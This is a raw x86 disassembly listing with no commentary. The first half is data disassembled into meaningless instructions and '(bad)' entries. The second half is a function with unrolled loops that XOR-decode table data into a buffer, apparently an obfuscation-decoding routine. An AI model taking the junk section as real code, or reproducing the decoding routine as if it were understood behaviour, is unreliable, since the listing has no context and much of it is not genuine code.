  40f6a4:	mov    DWORD PTR [ebx-0x68b0],eax
  40f6aa:	add    dl,al
  40f6ac:	pop    ebx
  40f6ae:	int3   
  40f6af:	sub    BYTE PTR [ebx+0x167ff],al
  40f6b5:	call   FWORD PTR [ebx]
  40f6b7:	xchg   BYTE PTR [ebx+0x0],al
  40f6bd:	rol    DWORD PTR [ebx+0x4b00ffb7],1
  40f6c3:	int3   
  40f6c4:	int3   
  40f6c5:	jmp    FWORD PTR [ebx-0xf2]
  40f6cb:	jmp    0x40f710
  40f6cd:	scas   al,BYTE PTR es:[edi]
  40f6ce:	(bad)  
  40f6cf:	ds (bad) 
  40f6d1:	jmp    FWORD PTR [ebp-0x66]
  40f6d4:	inc    DWORD PTR [eax]
  40f6d6:	jge    0x40f66c
  40f6d8:	(bad)  
  40f6d9:	inc    DWORD PTR [eax]
  40f6db:	inc    esi
  40f6dc:	pop    ss
  40f6dd:	ins    BYTE PTR es:[edi],dx
  40f6de:	push   ebp
  40f6e0:	add    bh,bh
  40f6e2:	mov    ebp,0x48ffff79
  40f6e7:	popa   
  40f6e8:	inc    DWORD PTR [eax]
  40f6ea:	add    BYTE PTR [edx-0x22],dh
  40f6ed:	mov    bh,0xff
  40f6ef:	(bad)  
  40f6f0:	int3   
  40f6f1:	int3   
  40f6f2:	or     esp,DWORD PTR [ebp-0x1]
  40f6f5:	call   FWORD PTR [esi-0x1a]
  40f6f8:	add    bh,bh
  40f6fa:	int3   
  40f6fb:	and    bl,BYTE PTR [eax-0x45]
  40f6fe:	and    ebp,0xffffffcc
  40f701:	dec    DWORD PTR [ebp+0x170000c4]
  40f707:	cmp    al,0xff
  40f709:	(bad)  
  40f70a:	inc    ebx
  40f70c:	cld    
  40f70d:	mov    al,0xff
  40f70f:	rol    DWORD PTR [eax],1
  40f711:	inc    DWORD PTR [ecx-0x7d33005f]
  40f717:	xchg   edi,eax
  40f718:	inc    DWORD PTR [eax]
  40f71a:	cmp    DWORD PTR [ebx+ebx*1],0x37
  40f71e:	add    BYTE PTR [ecx-0x3fb30001],dh
  40f724:	cmp    edi,0xffffff8d
  40f727:	pushf  
  40f728:	add    BYTE PTR [eax],al
  40f72a:	jmp    DWORD PTR [ebx-0x48]
  40f72d:	sbb    al,BYTE PTR [eax]
  40f72f:	jecxz  0x40f730
  40f731:	add    BYTE PTR [ecx],bh
  40f733:	jns    0x40f734
  40f735:	dec    DWORD PTR [ecx+eiz*2-0x1b7cff01]
  40f73c:	(bad)  
  40f73d:	jp     0x40f6c2
  40f73f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f740:	add    bh,bh
  40f742:	and    ebp,DWORD PTR [edi]
  40f744:	add    BYTE PTR [eax],al
  40f746:	nop
  40f747:	mov    ds:0x270083ff,al
  40f74c:	mov    ds:0xff9dcc8e,al
  40f751:	add    BYTE PTR [esi-0x376769e],ch
  40f757:	mov    ebp,0xe4ffffff
  40f75c:	sbb    al,0x39
  40f75e:	add    BYTE PTR [eax-0x1],ch
  40f761:	(bad)  
  40f762:	jmp    0xccea:0xdfffff3e
  40f769:	mov    edi,edi
  40f76b:	je     0x40f704
  40f76d:	xor    DWORD PTR [eax],eax
  40f76f:	adc    al,0xff
  40f771:	jmp    DWORD PTR [ecx+0x7c8300eb]
  40f777:	stc    
  40f778:	inc    DWORD PTR [eax]
  40f77a:	jmp    FWORD PTR [edi-0x52]
  40f77d:	loop   0x40f708
  40f77f:	adc    al,BYTE PTR [ebx+0x30f8ff]
  40f785:	or     DWORD PTR [esi+0xff6a],0x58
  40f78c:	xor    eax,0xffbb0063
  40f791:	jmp    FWORD PTR [esi+eax*1-0xf407c34]
  40f798:	add    DWORD PTR [eax],0x0
  40f79b:	retf   0x1789
  40f79e:	add    BYTE PTR [edi-0x1],dh
  40f7a1:	(bad)  
  40f7a2:	mov    ecx,0xe1ff00f7
  40f7a7:	(bad)  
  40f7aa:	sub    DWORD PTR [edx+eax*1+0xa],0x0
  40f7af:	ja     0x40f734
  40f7b1:	push   DWORD PTR [edx-0x1d]
  40f7b4:	(bad)  
  40f7b5:	push   DWORD PTR [eax+0x1b]
  40f7b8:	add    BYTE PTR [eax],al
  40f7ba:	add    BYTE PTR [edi],dl
  40f7bc:	fstp   DWORD PTR [ebx]
  40f7be:	add    BYTE PTR [ebx+0x0],dl
  40f7c1:	sub    DWORD PTR [edx+eax*8],0xffffffff
  40f7c5:	int3   
  40f7c6:	sub    DWORD PTR [ebx-0x5aff0001],0xad00b431
  40f7d0:	int3   
  40f7d1:	add    BYTE PTR [ebx-0x1b00337c],dh
  40f7d7:	icebp  
  40f7d8:	inc    DWORD PTR [ebx-0x1f404400]
  40f7de:	add    BYTE PTR [eax],bh
  40f7e0:	add    bh,bh
  40f7e2:	sub    ah,bh
  40f7e4:	(bad)  
  40f7e5:	(bad)  
  40f7e6:	mov    ebx,0xff83a6
  40f7eb:	test   al,0x1c
  40f7ed:	push   eax
  40f7ee:	add    BYTE PTR [ebx+eax*4-0x7665fc01],bl
  40f7f5:	dec    DWORD PTR [esp+edx*4]
  40f7f8:	dec    DWORD PTR [ecx+0x4a773a83]
  40f7fe:	inc    DWORD PTR [ecx]
  40f800:	inc    DWORD PTR [eax]
  40f802:	dec    edx
  40f803:	and    BYTE PTR [eax],al
  40f805:	or     DWORD PTR [ebx-0x76],0xffffffff
  40f809:	(bad)  
  40f80a:	jmp    FWORD PTR [ebx+eiz*8-0xd97ca1]
  40f811:	call   DWORD PTR [ebp-0x6]
  40f814:	(bad)  
  40f815:	push   DWORD PTR [edx-0x7c00ff1c]
  40f81b:	js     0x40f87a
  40f81d:	xchg   edi,eax
  40f81e:	add    BYTE PTR [edi+edi*8-0x7693a801],bh
  40f825:	(bad)  
  40f826:	clc    
  40f827:	sbb    bh,bh
  40f829:	inc    DWORD PTR [eax]
  40f82b:	loop   0x40f873
  40f82d:	mov    edx,0xffff2a00
  40f832:	bound  ecx,QWORD PTR ds:[ecx-0x3398e834]
  40f839:	int3   
  40f83a:	jmp    FWORD PTR [ebp+0xf]
  40f83d:	rol    BYTE PTR [ebx+0x3ff00bc],cl
  40f843:	outs   dx,DWORD PTR ds:[esi]
  40f844:	(bad)  
  40f845:	(bad)  
  40f846:	fnclex 
  40f848:	add    BYTE PTR [eax],al
  40f84a:	jmp    esi
  40f84c:	jg     0x40f895
  40f84e:	(bad)  
  40f84f:	ds mov edi,edi
  40f852:	lds    edi,FWORD PTR [edi-0x1]
  40f855:	push   DWORD PTR [ebp-0x76005a]
  40f85b:	mov    al,0x96
  40f85d:	cmp    edi,edi
  40f85f:	pusha  
  40f860:	add    BYTE PTR [ebx-0x7c008e31],al
  40f866:	loop   0x40f851
  40f868:	int3   
  40f869:	cmp    edi,0x70
  40f86c:	add    esi,DWORD PTR [ecx+0xcc5300]
  40f872:	fwait
  40f873:	push   es
  40f874:	or     esp,0xf
  40f877:	mov    esi,0xb4ffff00
  40f87c:	aas    
  40f87d:	adc    bh,bh
  40f87f:	push   ebp
  40f880:	(bad)  
  40f881:	inc    DWORD PTR [ecx-0x29]
  40f884:	inc    DWORD PTR [eax]
  40f886:	loop   0x40f82b
  40f888:	inc    DWORD PTR [ebx-0x56bd9800]
  40f88e:	inc    DWORD PTR [ecx+0x0]
  40f891:	int3   
  40f892:	pusha  
  40f893:	outs   dx,BYTE PTR ds:[esi]
  40f894:	inc    DWORD PTR [eax]
  40f896:	push   ds
  40f897:	popf   
  40f898:	dec    DWORD PTR [ecx+0x6fff1500]
  40f89e:	jmp    eax
  40f8a0:	mov    DWORD PTR [eax],eax
  40f8a2:	xchg   BYTE PTR ds:0xed30ffff,bl
  40f8a8:	add    ah,cl
  40f8aa:	push   DWORD PTR [ebx+ebp*4-0x9276b6]
  40f8b1:	adc    DWORD PTR [eax+ebp*1],0xffffffff
  40f8b5:	call   FWORD PTR [ecx+edx*1+0x1400ffff]
  40f8bc:	inc    ecx
  40f8bd:	adc    al,0xff
  40f8bf:	push   esi
  40f8c0:	add    BYTE PTR [eax],al
  40f8c2:	adc    al,0x97
  40f8c4:	(bad)  
  40f8c5:	jmp    FWORD PTR ds:0xff000042
  40f8cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8cc:	push   esp
  40f8cd:	xchg   bh,bh
  40f8cf:	inc    ebx
  40f8d0:	(bad)  
  40f8d1:	(bad)  
  40f8d2:	js     0x40f90c
  40f8d4:	cmp    edi,0x2d
  40f8d7:	mov    dh,0xcc
  40f8d9:	add    bh,bh
  40f8db:	sbb    dh,ch
  40f8dd:	(bad)  
  40f8df:	(bad)  
  40f8e0:	mov    DWORD PTR [ecx-0xff337e],ecx
  40f8e6:	jge    0x40f91d
  40f8e8:	cmp    edi,0xffffff89
  40f8eb:	mov    ebx,0x14007658
  40f8f0:	(bad)  
  40f8f1:	push   esp
  40f8f3:	(bad)  
  40f8f4:	(bad)  
  40f8f5:	(bad)  
  40f8f6:	cmp    ch,BYTE PTR [ecx-0x23770000]
  40f8fc:	pop    ecx
  40f8fd:	idiv   edi
  40f8ff:	mov    ecx,0x42edcc89
  40f904:	add    bh,bh
  40f906:	pop    ds
  40f907:	jmp    0x40f909
  40f909:	cmp    edi,0x2e
  40f90c:	test   al,0x65
  40f90e:	int3   
  40f90f:	jg     0x40f894
  40f911:	add    al,ch
  40f913:	bound  ecx,QWORD PTR [ecx-0x6c9401]
  40f919:	add    bh,bh
  40f91b:	pusha  
  40f91c:	jae    0x40f999
  40f91e:	int3   
  40f91f:	dec    edi
  40f920:	add    bh,bh
  40f922:	jno    0x40f8b4
  40f924:	mov    DWORD PTR [ebx+0x835e72],eax
  40f92a:	add    BYTE PTR [ebp-0x7ff759f],ch
  40f930:	mov    edi,edi
  40f932:	mov    al,ds:0x39830091
  40f937:	push   edi
  40f938:	inc    DWORD PTR [eax]
  40f93a:	add    dl,dh
  40f93c:	lds    esi,FWORD PTR [eax]
  40f93e:	push   DWORD PTR [ecx]
  40f940:	(bad)  
  40f941:	call   edx
  40f943:	xchg   esi,eax
  40f944:	inc    DWORD PTR [ebx-0x7cff2bd5]
  40f94a:	inc    esi
  40f94c:	sahf   
  40f94d:	add    ah,cl
  40f94f:	lahf   
  40f950:	(bad)  
  40f951:	call   DWORD PTR [esp+edi*2]
  40f954:	(bad)  
  40f955:	jmp    FWORD PTR [eax-0x32]
  40f958:	add    bh,bh
  40f95a:	jmp    DWORD PTR [edx+0x17ff1ed9]
  40f960:	add    BYTE PTR [eax],al
  40f962:	loopne 0x40f94d
  40f964:	inc    DWORD PTR [eax]
  40f966:	or     al,0x97
  40f968:	dec    esp
  40f96a:	(bad)  
  40f96b:	mov    eax,0x1836588
  40f970:	add    BYTE PTR [ebx-0x762a34],al
  40f976:	mov    esi,0xffff00f7
  40f97b:	sbb    DWORD PTR ds:0xff5100ab,0xffffffff
  40f982:	sub    eax,0x80ccffab
  40f987:	addr16 cmp edi,0xffffffff
  40f98b:	stos   DWORD PTR es:[edi],eax
  40f98c:	mov    ebx,DWORD PTR [esi-0x1]
  40f98f:	sbb    DWORD PTR [ebx-0xf6a47d],eax
  40f995:	add    BYTE PTR [edx-0xff7d],bh
  40f99b:	sub    ecx,DWORD PTR [esi+0x40]
  40f99e:	add    BYTE PTR [ebp-0x34],dh
  40f9a1:	int3   
  40f9a2:	push   esi
  40f9a3:	or     ecx,esp
  40f9a5:	adc    DWORD PTR [esi],0xffffffc3
  40f9a8:	inc    DWORD PTR [eax]
  40f9aa:	push   ebp
  40f9ac:	inc    ebp
  40f9ad:	fwait
  40f9ae:	jmp    DWORD PTR [edx]
  40f9b0:	int3   
  40f9b1:	add    BYTE PTR [esi],bl
  40f9b3:	push   ss
  40f9b4:	(bad)  
  40f9b5:	jmp    FWORD PTR [eax-0x8]
  40f9b8:	inc    DWORD PTR [ebx-0x4c6a6300]
  40f9be:	add    BYTE PTR [edi-0x1],bh
  40f9c1:	inc    DWORD PTR [ecx]
  40f9c3:	stos   BYTE PTR es:[edi],al
  40f9c4:	dec    DWORD PTR [ecx-0xffe57e]
  40f9ca:	(bad)  
  40f9cb:	fld    QWORD PTR [ebp+0x6f]
  40f9ce:	(bad)  
  40f9cf:	inc    BYTE PTR [eax]
  40f9d1:	call   DWORD PTR [edx-0x79]
  40f9d4:	inc    DWORD PTR [eax]
  40f9d6:	icebp  
  40f9d7:	ds (bad) 
  40f9d9:	(bad)  
  40f9da:	inc    ebx
  40f9dc:	dec    esp
  40f9dd:	ja     0x40f962
  40f9df:	mov    esi,0x917300ff
  40f9e4:	add    bh,bh
  40f9e6:	lock daa 
  40f9e8:	add    BYTE PTR [ebx+0x614b2583],al
  40f9ee:	int3   
  40f9ef:	dec    ecx
  40f9f0:	int3   
  40f9f1:	dec    esi
  40f9f3:	in     al,dx
  40f9f4:	inc    DWORD PTR [eax]
  40f9f6:	cdq    
  40f9f7:	jnp    0x40f9f8
  40f9f9:	add    bh,bh
  40f9fb:	add    ecx,DWORD PTR [edx-0x33b400fb]
  40fa01:	add    bl,bh
  40fa03:	inc    esp
  40fa04:	mov    DWORD PTR [eax],eax
  40fa06:	cld    
  40fa07:	es int3 
  40fa09:	add    bh,bh
  40fa0b:	mov    ebp,0x9e83ee40
  40fa10:	dec    DWORD PTR [ecx+0x89373e]
  40fa16:	pushf  
  40fa17:	push   es
  40fa18:	add    bh,bh
  40fa1a:	call   FWORD PTR ds:0xd1ff6709
  40fa20:	add    DWORD PTR [ebx+0xffa5c4],0xffffff85
  40fa27:	xlat   BYTE PTR ds:[ebx]
  40fa28:	add    BYTE PTR [ebx+0x6ff92bcc],al
  40fa2e:	and    DWORD PTR [esi],0x0
  40fa31:	add    dh,dh
  40fa33:	ror    ah,0x0
  40fa36:	xchg   ecx,eax
  40fa37:	aas    
  40fa38:	cmp    edi,0xffffffcc
  40fa3b:	cmp    al,0x8a
  40fa3d:	lods   al,BYTE PTR ds:[esi]
  40fa3e:	call   DWORD PTR ds:0x9821cc89
  40fa44:	inc    DWORD PTR [eax]
  40fa46:	sbb    bh,BYTE PTR [ecx]
  40fa48:	add    bh,bh
  40fa4a:	sub    DWORD PTR [ecx],0xffffffb3
  40fa4d:	push   ebp
  40fa4e:	add    BYTE PTR [esi-0x50797c01],bl
  40fa54:	inc    DWORD PTR [ebx-0x76002d60]
  40fa5a:	int3   
  40fa5b:	cmp    BYTE PTR [ecx],0x4b
  40fa5e:	inc    DWORD PTR [ebp-0x3c570000]
  40fa64:	mov    DWORD PTR [eax],eax
  40fa66:	mov    esp,DWORD PTR [ecx+ecx*4-0x1]
  40fa6a:	(bad)  
  40fa6b:	stc    
  40fa6c:	sbb    BYTE PTR [edi+edi*8+0x4e],0xcc
  40fa71:	call   FWORD PTR [ecx+edi*2+0x6d8ffff]
  40fa78:	(bad)  
  40fa79:	(bad)  
  40fa7a:	call   esi
  40fa7c:	dec    edi
  40fa7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa7e:	add    ch,ch
  40fa80:	(bad)  
  40fa81:	dec    DWORD PTR [edi-0x5d0000bc]
  40fa87:	or     al,BYTE PTR [eax]
  40fa89:	(bad)  
  40fa8a:	inc    DWORD PTR [ebx+ebp*2-0x33a60050]
  40fa91:	or     DWORD PTR [esp+esi*2+0x76fbff00],0xffffffff
  40fa99:	add    BYTE PTR [ebx+0xc5d19b],al
  40fa9f:	sub    eax,DWORD PTR [eax]
  40faa1:	jmp    DWORD PTR [ebp-0x50]
  40faa4:	add    BYTE PTR [ebx-0x162d],al
  40faaa:	or     DWORD PTR [edi+ecx*2-0x8],0xffffffff
  40faaf:	and    bh,bh
  40fab1:	sbb    DWORD PTR [esi],0xffffff84
  40fab4:	inc    DWORD PTR [eax]
  40fab6:	push   esi
  40fab7:	xor    edi,edi
  40fab9:	add    BYTE PTR [eax],al
  40fabb:	mov    ch,0xc0
  40fabd:	stc    
  40fabe:	add    BYTE PTR [ecx+ecx*4-0x3ffa01],bl
  40fac5:	mov    DWORD PTR ds:0xffff72,ecx
  40facb:	(bad)  
  40facc:	out    dx,al
  40facd:	das    
  40face:	call   FWORD PTR [ecx]
  40fad0:	inc    DWORD PTR [eax]
  40fad2:	xchg   edx,eax
  40fad3:	cmc    
  40fad4:	add    BYTE PTR [eax],al
  40fad6:	jp     0x40fb48
  40fad8:	int3   
  40fad9:	add    bh,bh
  40fadb:	mov    ds:0x218375ec,al
  40fae0:	(bad)  
  40fae1:	jmp    FWORD PTR [ebx+ebp*2]
  40fae4:	(bad)  
  40fae5:	jmp    DWORD PTR [ecx+0x61]
  40fae8:	dec    esp
  40faea:	call   DWORD PTR [ebx+0x30]
  40faed:	mov    eax,ds:0x8383e000
  40faf2:	pushf  
  40faf3:	pop    esi
  40faf4:	int3   
  40faf5:	push   DWORD PTR [eax-0xa]
  40fafb:	retf   
  40fafc:	push   0x1c83dc
  40fb01:	cmp    edx,0xffffff94
  40fb04:	add    bh,bh
  40fb06:	outs   dx,BYTE PTR ds:[esi]
  40fb07:	std    
  40fb08:	cmp    edi,0x0
  40fb0b:	push   0xdd0095c3
  40fb10:	add    BYTE PTR [ecx+0xccce3f],cl
  40fb16:	mov    ds:0xff8960,eax
  40fb1b:	lods   eax,DWORD PTR ds:[esi]
  40fb1c:	mov    WORD PTR [eax+eax*1+0x5b],cs
  40fb20:	int3   
  40fb21:	call   FWORD PTR [ecx+0x19]
  40fb24:	(bad)  
  40fb25:	(bad)  
  40fb26:	jns    0x40fb36
  40fb28:	inc    DWORD PTR [eax]
  40fb2a:	jmp    FWORD PTR [edi-0x23]
  40fb2d:	mov    ebp,0xff0010ff
  40fb32:	fnstenv [eax]
  40fb34:	add    BYTE PTR [eax],al
  40fb36:	jmp    DWORD PTR [ecx-0x1]
  40fb39:	inc    DWORD PTR [eax]
  40fb3b:	and    al,0x71
  40fb3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb3e:	push   DWORD PTR [esi-0x5a4eff01]
  40fb44:	inc    DWORD PTR [eax]
  40fb46:	scas   eax,DWORD PTR es:[edi]
  40fb47:	xor    bh,bh
  40fb49:	(bad)  
  40fb4a:	inc    DWORD PTR [ecx+0x4183fddb]
  40fb50:	int3   
  40fb51:	dec    DWORD PTR [esi]
  40fb53:	ins    DWORD PTR es:[edi],dx
  40fb54:	(bad)  
  40fb55:	call   FWORD PTR [edx]
  40fb57:	or     eax,0xc5008900
  40fb5c:	jp     0x40fb1d
  40fb5e:	cmp    DWORD PTR [ecx+0x202b8300],0x0
  40fb65:	add    BYTE PTR [edi+0x7e],al
  40fb68:	add    bh,bh
  40fb6a:	add    BYTE PTR [ebx-0x34],al
  40fb70:	sub    esp,0x28
  40fb73:	push   ebp
  40fb74:	push   esi
  40fb75:	mov    esi,DWORD PTR ds:0x445014
  40fb7b:	push   0xb
  40fb7d:	push   0x42
  40fb7f:	call   esi
  40fb81:	push   0xe5
  40fb86:	push   0x42
  40fb88:	mov    ebp,eax
  40fb8a:	call   esi
  40fb8c:	mov    edx,DWORD PTR ds:0x4480ac
  40fb92:	mov    DWORD PTR [esp+0x8],eax
  40fb96:	mov    eax,ds:0x448d20
  40fb9b:	push   ebx
  40fb9c:	add    eax,0xdc10
  40fba1:	mov    esi,0x6d
  40fba6:	push   edi
  40fba7:	jmp    0x40fbb0
  40fba9:	lea    esp,[esp+0x0]
  40fbb0:	movzx  ecx,BYTE PTR [edx+0x6]
  40fbb4:	movzx  edi,BYTE PTR [edx+0x4]
  40fbb8:	movzx  edx,WORD PTR [edx+0x1]
  40fbbc:	shl    ecx,0x8
  40fbbf:	add    ecx,edi
  40fbc1:	shl    ecx,0x10
  40fbc4:	add    ecx,edx
  40fbc6:	mov    DWORD PTR ds:0x448d10,ecx
  40fbcc:	mov    edx,0xfe858ee
  40fbd1:	sub    edx,DWORD PTR ds:0x448d1c
  40fbd7:	xor    edx,ecx
  40fbd9:	mov    DWORD PTR [eax],edx
  40fbdb:	mov    edx,DWORD PTR ds:0x4480ac
  40fbe1:	add    edx,0x8
  40fbe4:	mov    DWORD PTR ds:0x4480ac,edx
  40fbea:	movzx  ecx,BYTE PTR [edx+0x6]
  40fbee:	movzx  edi,BYTE PTR [edx+0x4]
  40fbf2:	movzx  edx,WORD PTR [edx+0x1]
  40fbf6:	shl    ecx,0x8
  40fbf9:	add    ecx,edi
  40fbfb:	shl    ecx,0x10
  40fbfe:	add    ecx,edx
  40fc00:	mov    DWORD PTR ds:0x448d10,ecx
  40fc06:	mov    edx,0xfe858ee
  40fc0b:	sub    edx,DWORD PTR ds:0x448d1c
  40fc11:	xor    edx,ecx
  40fc13:	mov    DWORD PTR [eax+0x4],edx
  40fc16:	mov    edx,DWORD PTR ds:0x4480ac
  40fc1c:	add    edx,0x8
  40fc1f:	mov    DWORD PTR ds:0x4480ac,edx
  40fc25:	movzx  ecx,BYTE PTR [edx+0x6]
  40fc29:	movzx  edi,BYTE PTR [edx+0x4]
  40fc2d:	movzx  edx,WORD PTR [edx+0x1]
  40fc31:	shl    ecx,0x8
  40fc34:	add    ecx,edi
  40fc36:	shl    ecx,0x10
  40fc39:	add    ecx,edx
  40fc3b:	mov    DWORD PTR ds:0x448d10,ecx
  40fc41:	mov    edx,0xfe858ee
  40fc46:	sub    edx,DWORD PTR ds:0x448d1c
  40fc4c:	xor    edx,ecx
  40fc4e:	mov    DWORD PTR [eax+0x8],edx
  40fc51:	mov    edx,DWORD PTR ds:0x4480ac
  40fc57:	add    edx,0x8
  40fc5a:	mov    DWORD PTR ds:0x4480ac,edx
  40fc60:	movzx  ecx,BYTE PTR [edx+0x6]
  40fc64:	movzx  edi,BYTE PTR [edx+0x4]
  40fc68:	movzx  edx,WORD PTR [edx+0x1]
  40fc6c:	shl    ecx,0x8
  40fc6f:	add    ecx,edi
  40fc71:	shl    ecx,0x10
  40fc74:	add    ecx,edx
  40fc76:	mov    DWORD PTR ds:0x448d10,ecx
  40fc7c:	mov    edx,0xfe858ee
  40fc81:	sub    edx,DWORD PTR ds:0x448d1c
  40fc87:	xor    edx,ecx
  40fc89:	mov    DWORD PTR [eax+0xc],edx
  40fc8c:	mov    edx,DWORD PTR ds:0x4480ac
  40fc92:	add    edx,0x8
  40fc95:	mov    DWORD PTR ds:0x4480ac,edx
  40fc9b:	movzx  ecx,BYTE PTR [edx+0x6]
  40fc9f:	movzx  edi,BYTE PTR [edx+0x4]
  40fca3:	movzx  edx,WORD PTR [edx+0x1]
  40fca7:	shl    ecx,0x8
  40fcaa:	add    ecx,edi
  40fcac:	shl    ecx,0x10
  40fcaf:	add    ecx,edx
  40fcb1:	mov    DWORD PTR ds:0x448d10,ecx
  40fcb7:	mov    edx,0xfe858ee
  40fcbc:	sub    edx,DWORD PTR ds:0x448d1c
  40fcc2:	xor    edx,ecx
  40fcc4:	mov    DWORD PTR [eax+0x10],edx
  40fcc7:	mov    edx,DWORD PTR ds:0x4480ac
  40fccd:	add    edx,0x8
  40fcd0:	mov    DWORD PTR ds:0x4480ac,edx
  40fcd6:	movzx  ecx,BYTE PTR [edx+0x6]
  40fcda:	movzx  edi,BYTE PTR [edx+0x4]
  40fcde:	movzx  edx,WORD PTR [edx+0x1]
  40fce2:	shl    ecx,0x8
  40fce5:	add    ecx,edi
  40fce7:	shl    ecx,0x10
  40fcea:	add    ecx,edx
  40fcec:	mov    edx,0xfe858ee
  40fcf1:	sub    edx,DWORD PTR ds:0x448d1c
  40fcf7:	mov    DWORD PTR ds:0x448d10,ecx
  40fcfd:	xor    edx,ecx
  40fcff:	mov    DWORD PTR [eax+0x14],edx
  40fd02:	mov    edx,DWORD PTR ds:0x4480ac
  40fd08:	add    edx,0x8
  40fd0b:	add    eax,0x18
  40fd0e:	dec    esi
  40fd0f:	mov    DWORD PTR ds:0x4480ac,edx
  40fd15:	jne    0x40fbb0
  40fd1b:	mov    eax,ds:0x448d20
  40fd20:	mov    edx,DWORD PTR ds:0x4480b0
  40fd26:	add    eax,0xe648
  40fd2b:	mov    esi,0x65
  40fd30:	movzx  ecx,WORD PTR [edx+0x5]
  40fd34:	movzx  edx,WORD PTR [edx+0x1]
  40fd38:	shl    ecx,0x10
  40fd3b:	add    ecx,edx
  40fd3d:	mov    DWORD PTR ds:0x448d10,ecx
  40fd43:	mov    edx,0xc67f4fb3
  40fd48:	sub    edx,DWORD PTR ds:0x448d1c
  40fd4e:	add    eax,0x10
  40fd51:	xor    edx,ecx
  40fd53:	mov    DWORD PTR [eax-0x10],edx
  40fd56:	mov    edx,DWORD PTR ds:0x4480b0
  40fd5c:	add    edx,0x8
  40fd5f:	mov    DWORD PTR ds:0x4480b0,edx
  40fd65:	movzx  ecx,WORD PTR [edx+0x5]
  40fd69:	movzx  edx,WORD PTR [edx+0x1]
  40fd6d:	shl    ecx,0x10
  40fd70:	add    ecx,edx
  40fd72:	mov    DWORD PTR ds:0x448d10,ecx
  40fd78:	mov    edx,0xc67f4fb3
  40fd7d:	sub    edx,DWORD PTR ds:0x448d1c
  40fd83:	xor    edx,ecx
  40fd85:	mov    DWORD PTR [eax-0xc],edx
  40fd88:	mov    edx,DWORD PTR ds:0x4480b0
  40fd8e:	add    edx,0x8
  40fd91:	mov    DWORD PTR ds:0x4480b0,edx
  40fd97:	movzx  ecx,WORD PTR [edx+0x5]
  40fd9b:	movzx  edx,WORD PTR [edx+0x1]
  40fd9f:	shl    ecx,0x10
  40fda2:	add    ecx,edx
  40fda4:	mov    DWORD PTR ds:0x448d10,ecx
  40fdaa:	mov    edx,0xc67f4fb3
  40fdaf:	sub    edx,DWORD PTR ds:0x448d1c
  40fdb5:	xor    edx,ecx
  40fdb7:	mov    DWORD PTR [eax-0x8],edx
  40fdba:	mov    edx,DWORD PTR ds:0x4480b0
  40fdc0:	add    edx,0x8
  40fdc3:	mov    DWORD PTR ds:0x4480b0,edx
  40fdc9:	movzx  ecx,WORD PTR [edx+0x5]
  40fdcd:	movzx  edx,WORD PTR [edx+0x1]
  40fdd1:	shl    ecx,0x10
  40fdd4:	add    ecx,edx
  40fdd6:	mov    edx,0xc67f4fb3
  40fddb:	sub    edx,DWORD PTR ds:0x448d1c
  40fde1:	mov    DWORD PTR ds:0x448d10,ecx
  40fde7:	xor    edx,ecx
  40fde9:	mov    DWORD PTR [eax-0x4],edx
  40fdec:	mov    edx,DWORD PTR ds:0x4480b0
  40fdf2:	add    edx,0x8
  40fdf5:	dec    esi
  40fdf6:	mov    DWORD PTR ds:0x4480b0,edx
  40fdfc:	jne    0x40fd30
  40fe02:	mov    eax,ds:0x448d20
  40fe07:	mov    edx,DWORD PTR ds:0x4480b4
  40fe0d:	add    eax,0xec98
  40fe12:	mov    esi,0x61
  40fe17:	jmp    0x40fe20
  40fe19:	lea    esp,[esp+0x0]
  40fe20:	movzx  ecx,BYTE PTR [edx+0x7]
  40fe24:	movzx  edi,BYTE PTR [edx+0x4]
  40fe28:	movzx  edx,WORD PTR [edx]
  40fe2b:	shl    ecx,0x8
  40fe2e:	add    ecx,edi
  40fe30:	shl    ecx,0x10
  40fe33:	add    ecx,edx
  40fe35:	mov    DWORD PTR ds:0x448d10,ecx
  40fe3b:	mov    edx,0xbe458686
  40fe40:	sub    edx,DWORD PTR ds:0x448d1c
  40fe46:	xor    edx,ecx
  40fe48:	mov    DWORD PTR [eax],edx
  40fe4a:	mov    edx,DWORD PTR ds:0x4480b4
  40fe50:	movzx  ecx,BYTE PTR [edx+0xf]
  40fe54:	movzx  edi,WORD PTR [edx+0xa]
  40fe58:	movzx  edx,BYTE PTR [edx+0x8]
  40fe5c:	shl    ecx,0x10
  40fe5f:	add    ecx,edi
  40fe61:	shl    ecx,0x8
  40fe64:	add    ecx,edx
  40fe66:	mov    DWORD PTR ds:0x448d10,ecx
  40fe6c:	mov    edx,0xbe458686
  40fe71:	sub    edx,DWORD PTR ds:0x448d1c
  40fe77:	xor    edx,ecx
  40fe79:	mov    DWORD PTR [eax+0x4],edx
  40fe7c:	mov    edx,DWORD PTR ds:0x4480b4
  40fe82:	add    edx,0x10
  40fe85:	mov    DWORD PTR ds:0x4480b4,edx
  40fe8b:	movzx  ecx,BYTE PTR [edx+0x7]
  40fe8f:	movzx  edi,BYTE PTR [edx+0x4]
  40fe93:	movzx  edx,WORD PTR [edx]
  40fe96:	shl    ecx,0x8
  40fe99:	add    ecx,edi
  40fe9b:	shl    ecx,0x10
  40fe9e:	add    ecx,edx
  40fea0:	mov    DWORD PTR ds:0x448d10,ecx
  40fea6:	mov    edx,0xbe458686
  40feab:	sub    edx,DWORD PTR ds:0x448d1c
  40feb1:	xor    edx,ecx
  40feb3:	mov    DWORD PTR [eax+0x8],edx
  40feb6:	mov    edx,DWORD PTR ds:0x4480b4
  40febc:	movzx  ecx,BYTE PTR [edx+0xf]
  40fec0:	movzx  edi,WORD PTR [edx+0xa]
  40fec4:	movzx  edx,BYTE PTR [edx+0x8]
  40fec8:	shl    ecx,0x10
  40fecb:	add    ecx,edi
  40fecd:	shl    ecx,0x8
  40fed0:	add    ecx,edx
  40fed2:	mov    DWORD PTR ds:0x448d10,ecx
  40fed8:	mov    edx,0xbe458686
  40fedd:	sub    edx,DWORD PTR ds:0x448d1c
  40fee3:	xor    edx,ecx
  40fee5:	mov    DWORD PTR [eax+0xc],edx
  40fee8:	mov    edx,DWORD PTR ds:0x4480b4
  40feee:	add    edx,0x10
  40fef1:	mov    DWORD PTR ds:0x4480b4,edx
  40fef7:	movzx  ecx,BYTE PTR [edx+0x7]
  40fefb:	movzx  edi,BYTE PTR [edx+0x4]
  40feff:	movzx  edx,WORD PTR [edx]
  40ff02:	shl    ecx,0x8
  40ff05:	add    ecx,edi
  40ff07:	shl    ecx,0x10
  40ff0a:	add    ecx,edx
